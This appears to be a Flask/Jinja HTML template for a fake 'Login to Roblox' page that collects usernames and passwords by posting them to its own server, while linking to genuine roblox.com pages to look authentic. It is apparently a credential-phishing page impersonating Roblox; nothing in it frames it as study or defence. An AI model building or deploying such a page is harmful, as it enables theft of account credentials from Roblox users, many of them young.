<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <h1>Login to Roblox</h1>
            <p class="sub-text"></p>
            <form method="post">
                <input type="text" name="username" placeholder="Username/Email/Phone" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
                <p class="msg">{{ msg }}</p>
            </form>
            <div class="links">
        <a href="https://www.roblox.com/login/forgot-password-or-username?identifier=">Forgot Password or Username?</a>
        <br>
        <a href="https://www.roblox.com/">Don't have an account? Sign Up</a>
      </div>
            
        </div>
    </div>
</body>
</html>
